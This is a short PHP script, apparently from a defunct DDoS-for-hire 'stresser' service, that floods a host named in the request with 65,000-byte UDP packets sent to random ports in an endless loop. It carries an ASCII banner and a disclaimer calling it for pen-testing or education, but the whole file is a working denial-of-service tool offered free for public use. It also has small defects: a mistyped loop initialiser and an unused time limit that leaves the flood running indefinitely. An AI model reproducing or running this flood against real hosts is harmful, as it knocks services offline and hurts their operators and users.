<?php
// Written by @runconnor
// Official https://nailstress.in UDP attack script ( RIP 2015-2018 )
/*
   _______  ______  _________  ____  ____  ____  _____
  / ___/ / / / __ \/ ___/ __ \/ __ \/ __ \/ __ \/ ___/
 / /  / /_/ / / / / /__/ /_/ / / / / / / / /_/ / /    
/_/   \__,_/_/ /_/\___/\____/_/ /_/_/ /_/\____/_/     
                                                      
Free to use by the public and free to modify and clone.
DISCLAIMER: Please note, DDOS and or ( DOS ) is illegal and using this 
script for illicit purposes is is punishable by law. This script is
intended for white-hat security pen-testing only, or educational use only.

*/

//ini_set('display_errors', 1);
//error_reporting(-1);

if (isset($_REQUEST['host']) && isset($_REQUEST['time'])) {

    // Attacking power 1-65535, determined on your acttack node.
    $attackpower = "65535";

    $packets = 0;
    $host = $_REQUEST['host'];
    $exec_time = $_REQUEST['time'];
    $max_time = $time+$exec_time;


    for($i-0;$i<65000;$i++) {
        $out .='Y';

    }
    while(1) {
        $packets++;
        $rand = rand(1,$attackpower);
        $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
        if($fp) {
            fwrite($fp, $out);
            fclose($fp);
        }
    }
}
?>
